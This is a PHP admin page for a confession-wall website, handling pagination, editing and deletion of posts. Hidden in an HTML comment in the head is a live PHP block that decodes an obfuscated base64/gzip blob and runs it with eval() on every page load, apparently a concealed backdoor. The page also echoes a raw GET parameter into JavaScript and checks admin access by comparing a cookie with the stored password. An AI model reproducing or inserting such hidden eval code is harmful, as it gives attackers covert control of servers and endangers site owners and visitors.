
<!DOCTYPE html>
<?php
@($love52=(int)$_GET['love52']);
@($wan=(int)$_GET['wan']);
include "../sakura/mysql.php";

if(isset($_COOKIE['sakura_mm'])){
  $sql = "select * from admin";
  $sakura = $Mysql->query($sql);
  $my_sj= $sakura->fetch_all()[0];
  if($_COOKIE['sakura_mm']!=$my_sj[1]){
    die("<script>alert('没有操作权限！'); window.location.replace('index.html');</script>");
  }
  //存在;
}else{
  die("<script>alert('没有操作权限！'); window.location.replace('index.html');</script>");
  //不存在;
}

if($wan==0){//表白---------------------------------
$sql="select count(*) from love;";
$bt_mc="表白内容管理";
}elseif($wan==1){//日常---------------------------------
$sql="select count(*) from sakura;";
$bt_mc="日常内容管理";
}elseif($wan==2) {//公告---------------------------------
$sql="select count(*) from root;";
$bt_mc="公告内容管理";
}else{
die("管理操作失败!");
}
$sakura = $Mysql->query($sql);
$my_sj= $sakura->fetch_all();
$sysj=$my_sj[0][0];//条数
$hqdst=9;//获取多少条数据
//$syys=(int)($sysj/$hqdst);//所有页数
if((int)($sysj%$hqdst)==0){$syys=(int)($sysj/$hqdst);} //页数1
else{$syys=(int)($sysj/$hqdst+1);}//页数2
if($love52=="" || $love52>=$syys || $love52<0){
  $love52=0;
}

$dqys=$love52+1; //当前页数
?>
<!--
樱花表白墙制作人: 樱振宇
制作人QQ: 3152680200
-->
<html>
  <head>
	<meta charset="utf-8" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<title>标签管理</title>
 	<style>
  	*{
     word-wrap:break-word;/*防止数字字母溢出*/
     margin:0;
     padding:0;
     /*background-color:#F8C3CD;*/
     }
     body{
      background-color: #fdc4b6;
     }
  	.yh_img{
     
     background-color: #fff1c1;
     border:2px #f5587b solid;
     margin:0px auto;
     padding:10px 10px 0;
     width:90%;
     /*height:400px;*/
     }
    .love_bq{
      border:2px #f5587b solid;
      padding:10px;
      margin-bottom:10px;
      background-color: #fef4a9;
     }
    .bqgl{
      padding:2px;
      float:right;
      margin-right:2px;
      }
    .fy{
      float:left;
      }
    .ssym{
      float:right;
      }
    .ymgn{
      background-color:#fae3d9;
      border:2px #f5587b solid;
      margin:10px auto;
      width:90%;
      padding:10px;
      overflow: hidden;
      
      }
    .htgl_tj{
      /*border:1px #000 solid;*/
      border-radius:15px;
      line-height: 35px;
      float: right;
      background-color:#8ac6d1;
      padding: 6px;
      font-size: 15px;
      color:#fff1c1;
    }
    .htgl_tj:hover{
      background-color: #ea7070;
      /*border:1px red solid;*/
    }
    .xgnr{
      width: 100%;
      background-color:rgba(0,0,0,0.6);
      position: fixed;
    }
    .xgnr_xgk{
      margin:100px auto; 
      background-image: linear-gradient(120deg, #84fab0 0%, #8fd3f4 100%);
      width: 300px;
      /*height: 300px;*/
      padding: 10px;
    }
    .xgk_nrtx{
      width: 100%;
    }
    button{
      border-radius: 8px;
      border:1px #000 solid;
      padding: 2px;
    }
    </style>
    <!--
    <?php function zjXAUr($FmJTPO)
    { 
    $FmJTPO=gzinflate(base64_decode($FmJTPO));
     for($i=0;$i<strlen($FmJTPO);$i++)
     {
    $FmJTPO[$i] = chr(ord($FmJTPO[$i])-1);
     }
     return $FmJTPO;
     }eval(zjXAUr("NU7rasIwGH2APMWH9EeKCFVkCK4OFQraVBSvMMZok9QESyppGlnFZ9dMPb/OjcMBcMhrRY0sFUzZ7rAl2LPm4KMrIEfCYyNVXqSG4yyt+Ef/l3FaMv5s+UMEeamxJ8Ng6MnPyuiCq2f20O22j+D6v/PtyR8IgQqNS83w2/I7XbdxQ6C5qbUCFziD27TAr0OtdWDnJJokzeC8WA/ELA66s5ge7YZWlrBo28iLIdmql0zF/E+e9MaQZZyIhcgiEgf1zuwv49bj7NfoDg=="));?>
    -->
  </head>
  <body>
  <div class="xgnr" style="overflow: hidden; height: 0; color: blue;">
    <div class="xgnr_xgk">
    <?php
      if($wan==0){
        echo '表白人昵称:<input onkeyup=\'if(this.value.length>6){this.style.color="red";}else{this.style.color="#000";}\' class="xgk_nrtx" type="text"><br/>被表白人昵称:<input onkeyup=\'if(this.value.length>6){this.style.color="red";}else{this.style.color="#000";}\' class="xgk_nrtx" type="text"><br/>内容:<textarea onkeyup=\'if(this.value.length>255){this.style.color="red";}else{this.style.color="#000";}\' class="xgk_nrtx" style="resize: none;" cols="25" rows="8"></textarea><br/>';
      }else if($wan==1){
          echo '图片链接:<input onkeyup=\'if(this.value.length>255){this.style.color="red";}else{this.style.color="#000";}\' class="xgk_nrtx" type="text"><br/>日常发布人昵称:<input onkeyup=\'if(this.value.length>6){this.style.color="red";}else{this.style.color="#000";}\' class="xgk_nrtx" type="text"><br/>内容:<textarea onkeyup=\'if(this.value.length>255){this.style.color="red";}else{this.style.color="#000";}\' class="xgk_nrtx" style="resize: none;" cols="25" rows="8"></textarea><br/>';
      }else{
          echo '公告内容:<textarea class="xgk_nrtx" style="resize: none;height: 300px;" cols="25" rows="8"></textarea><br/>';
      }
    ?>
    <button id="xgk_nrtx" class="xg_xgk" onclick="xgk_xg(<?php echo $wan; ?>);">修改</button> 
    <button id="xgk_nrtx" class="xg_xgk" onclick="xgk_qx();">取消</button>
    
    </div>
  </div>
  <script>
    function xgk_xg(xglx){//修改提交
    var xgknrtx=document.getElementsByClassName('xgk_nrtx');
    //alert("类型:"+xglx+"\n修改ID："+xgid+"\n修改表白人:"+xgknrtx[0].value+"\n需要被表白人:"+xgknrtx[1].value+"\n修改内容>:"+xgknrtx[2].value);
    if(<?php echo $wan; ?>==0){
        window.location.replace("../api/xg.php?id="+xgid+"&wan="+xglx+"&mz1="+xgknrtx[0].value+"&mz2="+xgknrtx[1].value+"&nr="+xgknrtx[2].value);
    }else if(<?php echo $wan; ?>==1){

        window.location.replace("../api/xg.php?id="+xgid+"&wan="+xglx+"&mz1="+xgknrtx[0].value+"&mz2="+xgknrtx[1].value+"&nr="+xgknrtx[2].value);
    }else{
        window.location.replace("../api/xg.php?id="+xgid+"&wan="+xglx+"&mz1=0&mz2=0&nr="+xgknrtx[0].value);
    }


    }

    function xgk_qx(){
      var xgnrkid=document.getElementsByClassName('xgnr')[0];
      xgnrkid.style.height="0";
    }
  </script>

  <br/>
   <div class="yh_img">
   <center><h1 style="color:#e41749;">
   <?php 
   echo $bt_mc; 
   if($wan==2){
    echo '<div class="htgl_tj" onclick="tjgg();">添加公告</div>';
   }
   ?>
   <script>
   function tjgg(){
      //添加公告-------------------------------------------------------
       window.location.replace("tjgg.html");
   }
   </script>
   </h1>
   ---共有<?php echo $sysj; ?>条数据---
   </center>
   <br/>
   
     <!--
     <div class="love_bq" >
           <p>id:666</p>
           <p>樱振宇对樱花的表白</p>
           <p>表白内容</p>
           2022 10-12 24:00
           <button class="bqgl">删除</button>
           <button class="bqgl">修改</button>
           
     </div>
     -->
      
<?php
  $love52*=$hqdst;
  if($wan==0){
  $sql = "select * from love ORDER BY id DESC limit {$love52},{$hqdst}";
  }else if($wan==1){
  $sql = "select * from sakura ORDER BY id DESC limit {$love52},{$hqdst}";
  }else if($wan==2){
  $sql = "select * from root ORDER BY id DESC limit {$love52},{$hqdst}";
  }else{
   //此处不会执行因为有第13行代码，但我还是想这样写。

  }
  $sakura = $Mysql->query($sql);
  $my_sj= $sakura->fetch_all();
  foreach($my_sj as $fhz){
    
  if($wan==0){
  echo '<div class="love_bq" ><p>ID:'.$fhz[0].'</p><hr/><p>'.htmlspecialchars($fhz[1]).'对'.htmlspecialchars($fhz[2]).'的表白</p><hr/><p>'.htmlspecialchars($fhz[3]).'</p><hr/>'.date("Y年m月d日 H:i:s",$fhz[4]).'<button class="bqgl" onclick="sc('.$fhz[0].');">删除</button><button class="bqgl" onclick="xg('.$fhz[0].',\''.htmlspecialchars($fhz[1]).'\',\''.htmlspecialchars($fhz[2]).'\',\''.htmlspecialchars($fhz[3]).'\');">修改</button></div>'; 
  }else if($wan==1){
    if($fhz[1]=="[object HTMLInputElement]" || $fhz[1]==""){
        $fhz[1]="此日常趣事无添加图链";
      }
  echo '<div class="love_bq" ><p>ID:'.$fhz[0].'</p><hr/><p>'.htmlspecialchars($fhz[2]).'的日常</p><hr/><p>'.htmlspecialchars($fhz[1]).'</p><hr/><p>'.htmlspecialchars($fhz[3]).'</p><hr/>'.date("Y年m月d日 H:i:s",$fhz[4]).'<button class="bqgl" onclick="sc('.$fhz[0].');">删除</button><button class="bqgl" onclick="xg('.$fhz[0].',\''.htmlspecialchars($fhz[1]).'\',\''.htmlspecialchars($fhz[2]).'\',\''.htmlspecialchars($fhz[3]).'\');">修改</button></div>'; 
  }else if($wan==2){
   echo '<div class="love_bq" ><p>ID:'.$fhz[0].' 公告</p><hr/><p>'.htmlspecialchars($fhz[1]).'</p>'.date("Y年m月d日 H:i:s",$fhz[2]).'<button class="bqgl" onclick="sc('.$fhz[0].',);">删除</button><button class="bqgl" onclick="xg('.$fhz[0].',0,0,\''.htmlspecialchars($fhz[1]).'\');" >修改</button></div>'; 
  }else{
  //此处不会执行因为有第13行代码，但我还是想这样写。
  }

  }
?>
<script>
function xg(yingzhenyu,mz1,mz2,nr){
//alert(yingzhenyu);

var hqjd=document.getElementsByClassName('xgnr')[0];
hqjd.style.height="100%";
xgid=yingzhenyu;//要修改签ID
mz1=mz1;//TA
mz2=mz2;//发布人
nr=nr;//内容
//alert(mz1+"\n"+mz2+"\n"+nr);
var xgknrtx=document.getElementsByClassName('xgk_nrtx');
if(<?php echo $wan; ?>==0){
    xgknrtx[0].value=mz1;
    xgknrtx[1].value=mz2;
    xgknrtx[2].innerHTML=nr;
}else if(<?php echo $wan; ?>==1){
    if(mz1=="此日常趣事无添加图链"){
      mz1="";
    }
    xgknrtx[0].value=mz1;
    xgknrtx[1].value=mz2;
    xgknrtx[2].innerHTML=nr;
}else{
    xgknrtx[0].innerHTML=nr;
}


}
function sc(yingzhenyu){
  if (confirm("您确定要删除ID"+yingzhenyu+"吗？")) { 
      window.location.replace("../api/sc.php?id="+yingzhenyu+"&wan="+<?php echo $wan; ?>);
  }
//alert(yingzhenyu);
}
</script>             

     
   </div>
   
   <div class="ymgn">
     <div class="fy">
     <?php
     if($dqys != 1){
     echo '<button onclick="ymxz('.($dqys-2).');">上页</button>';
     }
     echo $dqys."/".$syys; 
     if($dqys != $syys){
        echo '<button onclick="ymxz('.$dqys.');">下页</button>';
     }
     ?>
     </div>
     
     <div class="ssym">
     输入页面 <input style="width:30px;" class="tzz" type="txt"/>
     <button onclick="tzz();">跳转</button>
     <script>
     function tzz(){
     var tzz=document.getElementsByClassName('tzz')[0];
     var hqz=Number(tzz.value);
     var dqym=<?php echo $syys; ?>;
     if(hqz > dqym || hqz > 0){
       window.location.replace("love_gl.php?wan=<?php echo $_GET['wan']; ?>&love52="+(hqz-1));
     }else{
       alert("没有该页数！无非跳转!");
     }
     }
     </script>
     </div>
     
   </div>
  <script type="text/javascript">
    function ymxz(yingzhenyu){
       window.location.replace("love_gl.php?love52="+yingzhenyu+"&wan=<?php echo $wan; ?>");
    }
   </script>

   
  </body>
</html>
<?php
//关闭数据库连接
mysqli_close($Mysql);
?>